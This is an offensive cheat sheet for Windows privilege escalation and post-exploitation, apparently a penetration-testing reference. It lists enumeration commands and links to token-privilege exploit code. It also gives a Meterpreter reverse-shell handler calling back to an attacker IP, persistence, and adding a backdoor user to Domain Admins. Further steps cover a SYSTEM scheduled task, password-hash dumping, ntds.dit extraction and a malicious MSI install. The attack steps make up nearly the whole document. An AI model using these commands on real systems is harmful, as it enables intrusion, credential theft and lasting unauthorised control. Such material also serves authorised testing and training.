+-------------------------------+  
| INITIAL ENUMERATION |  
+-------------------------------+

**DOMAIN ENUM (if joined)**  
BloodHound / SharpHound

**WHOAMI?**  
```cmd
whoami  
echo %username%
```

**PRIVILEGES?**  
```cmd
whoami /priv
```

**SYSTEM INFO**  
```cmd
systeminfo  
wmic os get Caption,CSDVersion,OSArchitecture,Version
```

**SERVICES**  
```cmd
wmic service get name,startname  
net start
```

**ADMIN CHECK**  
```cmd
net localgroup administrators  
net user
```

**NETWORK**  
```cmd
netstat -anoy  
route print  
arp -A  
ipconfig /all
```

**USERS**  
```cmd
net users  
net user  
net localgroup
```

**FIREWALL**  
```cmd
netsh advfirewall firewall show rule name=all
```

**SCHEDULED TASKS**  
```cmd
schtasks /query /fo LIST /v > schtasks.txt
```

INSTALLATION RIGHTS  
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
+-----------------------------------------------------------------------+
|     WINDOWS PRIV ESC: GITHUB EXPLOITS                                 |
+-----------------------------------------------------------------------+
| Privilege Name              | GitHub PoC                              |
|---------------------------- |-----------------------------------------|
| SeDebugPrivilege            | github.com/bruno-1337/SeDebugPrivilege- |
| SeImpersonatePrivilege      | github.com/itm4n/PrintSpoofer           |
| SeAssignPrimaryToken        | github.com/b4rdia/HackTricks            |
| SeTcbPrivilege              | github.com/hatRiot/token-priv           |
| SeCreateTokenPrivilege      | github.com/hatRiot/token-priv           |
| SeLoadDriverPrivilege       | github.com/k4sth4/SeLoadDriverPrivilege |
| SeTakeOwnershipPrivilege    | github.com/hatRiot/token-priv           |
| SeRestorePrivilege          | github.com/xct/SeRestoreAbuse           |
| SeBackupPrivilege           | github.com/k4sth4/SeBackupPrivilege     |
| SeIncreaseQuotaPrivilege    | github.com/b4rdia/HackTricks            |
| SeSystemEnvironment         | github.com/b4rdia/HackTricks            |
| SeMachineAccount            | github.com/b4rdia/HackTricks            |
| SeTrustedCredManAccess      | learn.microsoft.com/...trusted-caller   |
| SeRelabelPrivilege          | github.com/decoder-it/RelabelAbuse      |
| SeManageVolumePrivilege     | github.com/CsEnox/SeManageVolumeExploit |
| SeCreateGlobalPrivilege     | github.com/b4rdia/HackTricks            |
+-----------------------------------------------------------------------+
```
Notes:
- PrintSpoofer is gold for `SeImpersonatePrivilege`.
- `SeManageVolume` has practical field PoCs.
+----------------------------+
|     MAINTAINING ACCESS     |
+----------------------------+
> METERPRETER REVERSE SHELL SETUP
```bash
  msfconsole
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST <attacker_ip>
  set LPORT <port>
  exploit
```

> PERSISTENCE
```bash
  meterpreter > run persistence -U -i 5 -p 443 -r <LHOST>
```

> PORT FORWARDING
```bash
  meterpreter > portfwd add -l 3306 -p 3306 -r <target_ip>
```

> SYSTEM MIGRATION
```bash
  meterpreter > run post/windows/manage/migrate
  meterpreter > migrate <PID>
```

> EXECUTE PAYLOADS
```powershell
  powershell.exe "C:\Tools\privesc.ps1"
```

+-------------------------------+
|        PRIVES EC CHECKLIST    |
+-------------------------------+
> UNQUOTED SERVICE PATHS
```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "C:\Windows" | findstr /v '"'
```

> WEAK SERVICE PERMISSIONS
```cmd
  accesschk.exe -uwcqv <service>
  sc qc <service>
  icacls "C:\Path\To\Service.exe"
```

> FILE TRANSFER OPTIONS
```cmd
  certutil.exe
  powershell (IEX)
  SMB / FTP / TFTP / VBScript
```

> CLEAR TEXT CREDENTIALS
```cmd
  findstr /si password *.txt *.xml *.ini
  dir /s *pass* == *cred* == *.config*
```

> WEAK FILE PERMISSIONS
```cmd
  accesschk.exe -uwqs Users c:\*.*
  accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

> NEW ADMIN USER (Local/Domain)
```cmd
  net user siren P@ssw0rd! /add
  net localgroup administrators siren /add
  net group "Domain Admins" siren /add /domain
```

+--------------------------------+
|     SCHEDULED TASK ABUSE       |
+--------------------------------+
> ENUM
```cmd
  schtasks /query /fo LIST /v > tasks.txt
```

> CREATE SYSTEM TASK
```cmd
  schtasks /create /ru SYSTEM /sc MINUTE /mo 5 /tn RUNME /tr "C:\Tools\sirenMaint.exe"
```

> RUN TASK
```cmd
  schtasks /run /tn "RUNME"
```

+-------------------------------+
|    POST EXPLOIT ENUMERATION   |
+-------------------------------+
> NETWORK USERS
```cmd
  net user
  net user <target>
  net localgroup administrators
```

> NT AUTHORITY CHECKS
```cmd
  whoami
  accesschk.exe /accepteula
  MS09-012.exe "whoami"
```

> HASH DUMP
`  meterpreter > hashdump`

> EXFILTRATE ntds.dit
`  Use secretsdump.py or disk capture tools`

> INSTALLER ABUSE
```cmd
  AlwaysInstallElevated = 1
  msiexec /i evil.msi
```

> SHARE ENUMERATION
```cmd
  net share
  net use
  net use Z: \\TARGET\SHARE /persistent:yes
```

+----------------------------+
|   TOOLKIT / RESOURCES      |
+----------------------------+
> Windows Exploit Suggester
  https://github.com/AonCyberLabs/Windows-Exploit-Suggester

> Cross Compile Payloads (Linux > Windows)
```bash
  apt-get install mingw-w64
  x86: i686-w64-mingw32-gcc hello.c -o hello.exe
  x64: x86_64-w64-mingw32-gcc hello.c -o hello64.exe
```

> Additional Reading
  https://www.fuzzysecurity.com/tutorials/16.html
  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation